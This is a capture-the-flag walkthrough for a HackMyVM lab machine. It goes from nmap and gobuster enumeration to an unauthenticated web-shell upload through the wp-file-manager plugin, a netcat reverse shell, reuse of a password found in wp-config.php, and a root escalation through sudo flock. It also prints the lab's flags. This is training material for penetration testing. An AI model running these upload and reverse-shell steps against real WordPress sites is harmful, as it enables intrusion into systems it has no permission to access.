# Vulny

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.26
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-22 12:38 +07
Nmap scan report for 10.11.5.26
Host is up (0.0035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: 08:00:27:59:82:F6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.68 seconds
```
![web](/walkthroughs/hackmyvm/machines/beginner/Vulny/web.png)


#### Gobuster (Directory Enumearation)
```bash
┌──(dungcngo㉿kali)-[~]
└─$ gobuster dir -u http://10.11.5.26/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.26/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 313] [--> http://10.11.5.26/javascript/]
/secret               (Status: 301) [Size: 309] [--> http://10.11.5.26/secret/]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://10.11.5.26/javascript/       
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.11.5.26 Port 80</address>
</body></html>
```

#### WordPress Discovery

![secret-web](/walkthroughs/hackmyvm/machines/beginner/Vulny/secret-web.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.26/secret -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,dump
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.26/secret
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,bak,dump
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.bak             (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.hta.dump            (Status: 403) [Size: 275]
/.htaccess.bak        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.dump       (Status: 403) [Size: 275]
/.htaccess.dump       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.bak        (Status: 403) [Size: 275]
/wp-admin             (Status: 301) [Size: 318] [--> http://10.11.5.26/secret/wp-admin/]                                                                                    
/wp-content           (Status: 301) [Size: 320] [--> http://10.11.5.26/secret/wp-content/]                                                                                  
/wp-includes          (Status: 301) [Size: 321] [--> http://10.11.5.26/secret/wp-includes/]                                                                                 
/wp-settings.php      (Status: 500) [Size: 0]
```

#### WordPress Directory Analysis
![wp-content](/walkthroughs/hackmyvm/machines/beginner/Vulny/wp-content.png)
![wp-admin](/walkthroughs/hackmyvm/machines/beginner/Vulny/wp-admin.png)
![wp-includes](/walkthroughs/hackmyvm/machines/beginner/Vulny/wp-includes.png)

#### Critical File Discovery 
![wp-file](/walkthroughs/hackmyvm/machines/beginner/Vulny/wp-file.png)


```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.26/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip
--2026-05-25 08:46:02--  http://10.11.5.26/secret/wp-content/uploads/2020/10/wp-file-manager-6.O.zip
Connecting to 10.11.5.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3675008 (3.5M) [application/zip]
Saving to: ‘wp-file-manager-6.O.zip’

wp-file-manager-6.O.z 100%[======================>]   3.50M  10.1MB/s    in 0.3s    

2026-05-25 08:46:03 (10.1 MB/s) - ‘wp-file-manager-6.O.zip’ saved [3675008/3675008]
```
**Vulnerability Confirm**
```bash
┌──(dungcngo㉿kali)-[~]
└─$ curl -I http://10.11.5.26/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 
HTTP/1.1 200 OK
Date: Fri, 22 May 2026 18:03:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=lc84atgtjpnj0r2l08g4oln4ta; path=/
Content-Length: 27
Content-Type: application/json; charset=utf-8
```

### Initial Access
#### Payload Preparation
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano shell.php              
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat shell.php 
<?php system($_GET["cmd"]); ?>
```

#### Exploit Execution
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -X POST "http://10.11.5.26/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@shell.php"
{"added":[{"isowner":false,"ts":1779474094,"mime":"text\/x-php","read":1,"write":1,"size":"31","hash":"l1_c2hlbGwucGhw","name":"shell.php","phash":"l1_Lw","url":"\/secret\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/shell.php"}],"removed":[],"changed":[{"isowner":false,"ts":1602759751,"mime":"directory","read":1,"write":1,"size":0,"hash":"l1_Lw","name":"files","rootRev":"","options":{"path":"","url":"","tmbUrl":"","disabled":[],"separator":"\/","copyOverwrite":1,"uploadOverwrite":1,"uploadMaxSize":9223372036854775807,"uploadMaxConn":3,"uploadMime":{"firstOrder":"deny","allow":["all"],"deny":["all"]},"dispInlineRegex":"^(?:(?:video|audio)|image\/(?!.+\\+xml)|application\/(?:ogg|x-mpegURL|dash\\+xml)|(?:text\/plain|application\/pdf)$)","jpgQuality":100,"archivers":{"create":[],"extract":[],"createext":[]},"uiCmdMap":[],"syncChkAsTs":1,"syncMinMs":0,"i18nFolderName":0,"tmbCrop":1,"tmbReqCustomData":false,"substituteImg":true,"onetimeUrl":true,"trashHash":"t1_Lw","csscls":"elfinder-navbar-root-local"},"volumeid":"l1_","locked":1,"isroot":1,"phash":""}]}     
```

#### Remote Code Execution Verification
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -X POST "http://10.11.5.26/secret/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Reverse shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -X POST "http://10.11.5.26/secret/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=busybox%20nc%2010.11.5.4%204444%20-e%20sh"
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.26] 35650
id;hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
vulny
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
<ress/wp-content/plugins/wp-file-manager/lib/files$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo; fg                 
[1]  + continued  nc -lvnp 4444
                               export SHELL=bash
<-file-manager/lib/files$ export TERM=xterm-256color                         
www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cd /
www-data@vulny:/$ 
```

### Shell (adrian)
```bash
www-data@vulny:/$ ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
www-data@vulny:/$ cd /home
www-data@vulny:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Oct 15  2020 .
drwxr-xr-x 20 root   root   4096 Oct 15  2020 ..
drwxr-xr-x  4 adrian adrian 4096 Oct 15  2020 adrian
```
```bash
www-data@vulny:/home$ cd adrian/
www-data@vulny:/home/adrian$ ls
user.txt
www-data@vulny:/home/adrian$ ls -la
total 36
drwxr-xr-x 4 adrian adrian 4096 Oct 15  2020 .
drwxr-xr-x 3 root   root   4096 Oct 15  2020 ..
-rw------- 1 adrian adrian   51 Oct 15  2020 .Xauthority
-rw-r--r-- 1 adrian adrian  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 adrian adrian 3771 Feb 25  2020 .bashrc
drwx------ 2 adrian adrian 4096 Oct 15  2020 .cache
drwxrwxr-x 3 adrian adrian 4096 Oct 15  2020 .local
-rw-r--r-- 1 adrian adrian  807 Feb 25  2020 .profile
-rw-r--r-- 1 adrian adrian    0 Oct 15  2020 .sudo_as_admin_successful
-rw------- 1 adrian adrian   16 Oct 15  2020 user.txt
```

```bash
www-data@vulny:/usr/share/wordpress$ ls
index.php           wp-comments-post.php  wp-includes        wp-settings.php
readme.html         wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php     wp-config.php         wp-load.php        wp-trackback.php
wp-admin            wp-content            wp-login.php       xmlrpc.php
wp-blog-header.php  wp-cron.php           wp-mail.php
www-data@vulny:/usr/share/wordpress$ cat wp-config.php 
<?php
/***
 * WordPress's Debianised default master config file
 * Please do NOT edit and learn how the configuration works in
 * /usr/share/doc/wordpress/README.Debian
 ***/

/* Look up a host-specific config file in
 * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php
 */
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
$debian_server = preg_replace("/[^a-zA-Z0-9.\-]/", "", $debian_server);
$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';
/* Main site in case of multisite with subdomains */
$debian_main_server = preg_replace("/^[^.]*\./", "", $debian_server);
$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';

if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

/* idrinksomewater */

/* Default value for some constants if they have not yet been set
   by the host-specific config files */
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP_CORE_UPDATE'))
    define('WP_CORE_UPDATE', false);
if (!defined('WP_ALLOW_MULTISITE'))
    define('WP_ALLOW_MULTISITE', true);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost');
if (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))
    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');

/* Default value for the table_prefix variable so that it doesn't need to
   be put in every host-specific config file */
if (!isset($table_prefix)) {
    $table_prefix = 'wp_';
}

if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
    $_SERVER['HTTPS'] = 'on';

require_once(ABSPATH . 'wp-settings.php');
?>
```
This password of `adrian` is `idrinksomewater`.

#### User Privilege Escalation
```bash
www-data@vulny:/usr/share/wordpress$ su - adrian
Password: 
adrian@vulny:~$ id ; hostname
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
vulny
```

#### Flags (user.txt)
```bash
adrian@vulny:~$ ls
user.txt
adrian@vulny:~$ cat user.txt 
HMViuploadfiles
```

### Privilege Escalation
#### Sudo Enumeration
```bash
adrian@vulny:~$ sudo -l
Matching Defaults entries for adrian on vulny:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on vulny:
    (ALL : ALL) NOPASSWD: /usr/bin/flock
```

#### Abuse
![shell - gtfobins](/walkthroughs/hackmyvm/machines/beginner/Vulny/shell-gtfobins.png)

```bash
adrian@vulny:~$ sudo /usr/bin/flock -u / /bin/sh
# id; hostname
uid=0(root) gid=0(root) groups=0(root)
vulny
# bash -pi
root@vulny:/home/adrian#
```

#### Flags (root.txt)
```bash
root@vulny:/home/adrian# cd /root
root@vulny:~# ls
root.txt  snap
root@vulny:~# cat root.txt 
HMVididit
```
***You are welcome!***
